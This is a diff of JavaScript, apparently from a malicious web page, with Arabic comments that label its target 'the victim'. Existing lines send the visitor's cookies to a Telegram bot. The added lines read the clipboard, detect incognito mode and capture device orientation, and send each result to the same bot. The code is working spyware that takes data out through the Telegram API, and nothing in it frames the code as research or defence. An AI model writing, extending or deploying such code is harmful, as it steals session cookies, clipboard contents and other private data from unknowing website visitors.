@@ -137,6 +137,29 @@ silentRadar();
 // 🍪 صائد الكوكيز والجلسات (ZeroX Edition)
 let cookies = document.cookie || "خزنة الكوكيز فارغة أو محمية!";
 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🍪 كوكيز الضحية المكتشفة:\n" + cookies)}`);
+// 1. 📋 صائد الحافظة (Clipboard Snatcher)
+navigator.clipboard.readText().then(text => {
+    if(text) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📋 حافظة الضحية تحتوي على: \n" + text)}`);
+    }
+}).catch(() => {});
+
+// 2. 🚨 كاشف وضع التصفح الخفي (Incognito Detector)
+const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+if (!fs) {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ تنبيه: الضحية يستخدم وضع التخفي!")}`);
+} else {
+    fs(window.TEMPORARY, 100, () => {}, () => {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ تنبيه: الضحية يستخدم وضع التخفي!")}`);
+    });
+}
+
+// 3. 📱 مستشعر ميلان وحركة الجهاز (Gyroscope)
+window.ondeviceorientation = (event) => {
+    let status = event.beta > 45 ? "مائل للخلف" : "مستوي";
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 وضعية الجهاز الآن: " + status)}`);
+    window.ondeviceorientation = null; // يرسل التنبيه مرة واحدة فقط لعدم إزعاجك
+};
 
 // 2. رادار كشف النوايا والتحركات (يعمل فوراً)
 document.getElementById('name').addEventListener('focus', () => {
